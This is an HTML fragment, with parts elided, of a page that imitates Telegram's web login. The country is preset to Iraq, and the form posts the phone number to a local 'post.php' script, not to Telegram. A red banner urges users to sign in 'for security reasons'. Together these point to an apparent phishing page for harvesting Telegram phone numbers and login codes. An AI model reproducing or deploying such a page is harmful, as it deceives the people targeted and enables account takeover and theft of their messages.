  ...
  <div class="login_page">
    <div class="login_head_wrap clearfix" ng-switch="progress.enabled">
      ...
      <a class="login_head_logo_link" href="https://telegram.org" target="_blank">
        <i href="https://telegram.org/img/t_logo.svg?1" style="width: 36px;
height: 36px;
display: inline-block;
vertical-align: top;
margin-right: 18px;
background-image: url(https://telegram.org/img/t_logo.svg?1);
background-repeat: no-repeat;
background-position: 0px 0px;
background-size: 36px;" class="icon icon-tg-logo"></i><i class="icon icon-tg-title"></i>
      </a>
    </div>
    ...
    <div class="login_form_wrap">
      ...
      <!----><form action="post.php" method="post" name="mySendCodeForm" ng-if="!credentials.phone_code_hash" ng-submit="sendCode()" class="ng-pristine ng-invalid ng-invalid-required">
         <h6 style="color: #ff0000;">Please Sign In to your account for security reasons</h6>
        ...
        <div class="md-input-group md-input-has-value login_phone_country_input_group" ng-click="chooseCountry()">
          ...
          <div autocomplete="off" class="md-input" ng-bind="credentials.phone_country_name">Iraq</div>
        </div>
        ...
        <div class="login_phone_groups_wrap clearfix">
          ...
          <div class="md-input-group login_phone_code_input_group md-input-has-value md-input-animated" ng-class="{'md-input-error': error.field == 'phone'}" my-labeled-input="">
            ...
            <input autocomplete="off" class="md-input ng-pristine ng-valid ng-not-empty ng-touched" my-focused="" name="phone_country" type="tel" ng-model="credentials.phone_country" style="" value="+964">
          </div>
